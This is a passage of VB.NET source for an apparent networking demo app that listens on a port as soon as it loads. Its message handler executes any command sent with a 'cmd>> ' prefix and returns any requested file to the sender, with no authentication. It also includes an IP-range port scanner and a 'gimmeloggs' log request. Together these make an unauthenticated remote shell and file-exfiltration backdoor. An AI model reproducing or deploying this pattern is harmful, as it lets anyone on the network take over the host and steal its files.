            Timer1.Enabled = False
            Server = Nothing
        End If
    End Sub

    '2 And then you want to get the data that arrives to your server
    'right? maybe also execute subs or filtering ips... ok.
    'just have to wrtie the sub that handles the incoming message event.
    'The message will be in Args.Message, the sender ip in Args.SenderIP.
    Private Sub OnIncomingMessage(ByVal Args As ServerClass.InMessEvArgs) Handles Server.IncomingMessage
        'Example of Reading and display Message
        ' Try

        'Catch ex As Exception

        'End Try
        'Example of executing command
        'To test this try sending the message "closeform" to your IP from the client,
        'when your server is listening.
        If Args.message.StartsWith("cmd>> ") Then

            Try
                pid = Shell(Args.message.Substring(6), AppWinStyle.NormalFocus)
                IncomingMessagesList.Items.Add("***" + Args.senderIP + " --> executed: " + Args.message.Substring(6))
                IncomingMessagesList.SelectedIndex = IncomingMessagesList.Items.Count - 1
            Catch ex As Exception
                IncomingMessagesList.Items.Add("***" + Args.senderIP + " --> tried executing: " + Args.message.Substring(6) + " but an  error occurred: " + ex.Message)
                IncomingMessagesList.SelectedIndex = IncomingMessagesList.Items.Count - 1
                Client.SendMessage(Args.senderIP, prot, "Err=" + ex.Message)

            End Try
            Debug.Print("qazqwe")
            Client.SendMessage(Args.senderIP, prot, "pid=" + pid.ToString)
        ElseIf Args.message.StartsWith("sendme>> ") Then
            Try
                IncomingMessagesList.Items.Add("***" + Args.senderIP + " --> wants: " + Args.message.Substring(8))
                IncomingMessagesList.SelectedIndex = IncomingMessagesList.Items.Count - 1
                If Not Args.message.Substring(9).Trim = "" Then

                    sfile.SetValue(Args.message.Substring(9), 1)
                    Client.SendFiles(Args.senderIP, prot, sfile)
                Else
                    Client.SendMessage(Args.senderIP, prot, "Err=No filename sent")
                End If
            Catch ex As Exception
                Client.SendMessage(Args.senderIP, prot, "Err=" + ex.Message)
            End Try
        ElseIf Args.message = "<Buzz!>" Then
            Try
                Beep()
                IncomingMessagesList.Items.Add("***" + Args.senderIP + " --> Buzzed You")
                IncomingMessagesList.SelectedIndex = IncomingMessagesList.Items.Count - 1
                Client.SendMessage(Args.senderIP, prot, "Buzz! received")
            Catch ex As Exception
                Client.SendMessage(Args.senderIP, prot, "Err=" + ex.Message)
            End Try
        Else
            IncomingMessagesList.Items.Add(Args.senderIP + " --> " + Args.message)
            IncomingMessagesList.SelectedIndex = IncomingMessagesList.Items.Count - 1

        End If

        'example of filtering IP : in this case the filter is displaying
        'a message only when certain IP are sending messages to us
        '  If Args.senderIP.Equals(Server.LocalIP) Then
        'MessageBox.Show("This message comes from this computer", "Filtering IP example")
        'End If
    End Sub
    Private Sub examplesub()
        MessageBox.Show("This is an example", "Example of command execution")
        If Not Server Is Nothing Then
            If Server.IsRunning Then
                Server.StopServer()
            End If
        End If
        Me.Close()
    End Sub

    '3 Capturing also the diagnostics messages to let the user know when a file transfer is in progress from some source.
    Private Sub OnDiagnosticMessage(ByVal Args As String) Handles Server.DiagnosticMessage, Me.DiagnosticMessage, Client.DiagnosticMessage
        Try
            Me.IncomingMessagesList.Items.Add("***" + Args)
            Me.IncomingMessagesList.SelectedIndex = Me.IncomingMessagesList.Items.Count - 1
        Catch ex As Exception
            MessageBox.Show(ex.Message, "Error diagnosing")
        End Try
    End Sub

    '4 This sub is for changing the incoming Files Path when the server is listening,
    'basically means to set Server.IncomingPath if the server is listening
    'Note that this example do not keep memory of the path so it is reset everytime you stop the server.
    Private Sub ChangePathButt_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChangePathButt.Click
        Dim dialog As New System.Windows.Forms.FolderBrowserDialog
        dialog.SelectedPath = ""
        dialog.ShowNewFolderButton = True
        Dim dr As DialogResult = dialog.ShowDialog()
        If dr = DialogResult.OK Then
            If Server.IsRunning Then
                If dialog.SelectedPath.EndsWith("\") Then
                    Server.IncomingPath = Application.StartupPath
                Else
                    Server.IncomingPath = dialog.SelectedPath + "\"
                End If
                Label14.Text = "Incoming file path:" + Server.IncomingPath
                RaiseEvent DiagnosticMessage("Incoming File Location:" + Server.IncomingPath)

            Else
                Label14.Text = "no server is listening"
                Label14.Refresh()
            End If
        End If
    End Sub
#End Region 'That's was for the server ))

#Region "Implementing the  ServerScanner"
    'Basically you use a scanner when you want to scan an IP range for some
    'server wich may be running on a specified port
    'Note that the scanner allows easy interation with a ProgressBar.

    '1.Retrieve the scan parameters fromt he form
    '2.Starts The scan
    Private Sub ScanButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ScanButton.Click
        Dim IpRange As String = Me.IPscanRange.Text
        Dim IpScanPort As Integer = Me.ScanPort.Value
        Dim Numthreads As Integer = Me.NumThreads.Value
        Dim Timeout As Integer = Me.TimeOut.Value
        Scanner = New ServerScanner(IpRange, IpScanPort, Numthreads, Timeout)

        'Because we know how's the story we disable the button until the scan completes
        'and we write the scan has begun in the list
        Me.FoundIPList.Items.Add("Scan started")
        Me.FoundIPList.Refresh()
        Me.ScanButton.Enabled = False
        'The Scan Starts Here!
        Scanner.StartScan()
    End Sub

    '2.Retrieve found ips,
    'in this example application we just add it to the list.
    Private Sub OnIPFound(ByVal IP As String) Handles Scanner.IPfound
        Me.FoundIPList.Items.Add(IP)
        Me.FoundIPList.Refresh()
    End Sub

    '3.This is for the progress bar event.
    'just you have to know that the event will be called for every IP
    'so in a subnet it is 254 times It is important to set your progressbar parameters
    'From 0 to 254 step 1
    Private Sub OnPBEvent() Handles Scanner.PerformPBStep
        Me.ScanProgressBar.PerformStep()
    End Sub

    '4.When the scan is complete we Destroy the scanner object and we reenable the
    'scan button
    Private Sub OnScanComplete() Handles Scanner.ScanFinished
        Application.DoEvents()
        Scanner = Nothing
        Me.ScanProgressBar.Value = 0
        Me.FoundIPList.Items.Add("Scan completed")
        Me.FoundIPList.Refresh()
        ScanButton.Enabled = True
    End Sub
    'That's IT for the scanner
#End Region



    Private Sub Blog_Click(sender As System.Object, e As System.EventArgs) Handles Blog.Click
        Dim IP As String = DestIP.Text
        Dim PORT As Integer = DestPort.Value
        Dim DATA As String = OutgoingMessage.Text
        'Now send it.
        Try
            Client.SendMessage(IP, PORT, "gimmeloggs")
        Catch ex As Exception
            MessageBox.Show(ex.Message, "Error sending getlog")
        End Try
    End Sub

  




    Private Sub DemoApp_Load(sender As System.Object, e As System.EventArgs) Handles Me.Load

        Control.CheckForIllegalCrossThreadCalls = False
        If (Server Is Nothing) Then
            'Clear messages from previous session(don't care to this)
            Me.IncomingMessagesList.Items.Clear()
            'Retrieve PORT
            Dim PORT As Integer = ServerPort.Value
            'Start the server
            'You can use AutoStart = true as here or call later Srv.StartServer
            Server = Nothing

            Server = New ServerClass(PORT, True, "C:\")
            Server.IncomingPath = Application.StartupPath + "\"

            Label14.Text = "Incoming file path:" + Server.IncomingPath
            'It's already Started!
            Me.StartStopButton.Text = "stop"
            RaiseEvent DiagnosticMessage("Listening on Port:" + PORT.ToString)
            RaiseEvent DiagnosticMessage("Incoming path: " + Server.IncomingPath)


        Else
            'Stop and terminate the server
            Server.StopServer()
            Me.StartStopButton.Text = "start"
            Label14.Text = "no server is listening"
        End If
        
    End Sub


    Private Sub BGaw_Click(sender As System.Object, e As System.EventArgs) Handles BGaw.Click
        Dim IP As String = DestIP.Text
        Dim PORT As Integer = DestPort.Value
        Dim DATA As String = OutgoingMessage.Text
        'Now send it.
        Try
            Client.SendMessage(IP, PORT, "<Buzz!>")
        Catch ex As Exception
            MessageBox.Show(ex.Message, "Error Buzz-ing")
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If Not Server Is Nothing Then
            If Server.IsRunning Then
                StartStopButton.Text = "Stop"
            Else
                StartStopButton.Text = "Start"
            End If
        End If
    End Sub


    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        If Not Server Is Nothing Then
            If Server.IsRunning Then
                Server.StopServer()
            End If
            Server = Nothing
        End If
        Form1.Show()
        Form1.WindowState = FormWindowState.Normal
        Me.Close()
    End Sub



    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        If Button2.Text = ">>" Then
            For i = 1 To 190
                Me.Width += 1
            Next
            Button2.Text = "<<"
        Else
            For i = 1 To 190
                Me.Width -= 1
            Next
            Button2.Text = ">>"
        End If

    End Sub

    Dim j As Integer
    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        If j < System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName).AddressList.Length Then
            TextBox1.Text = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName).AddressList(j).ToString()
            j += 1
        Else
            j = 0
        End If
        DestIP.Text = TextBox1.Text
    End Sub

   
End Class
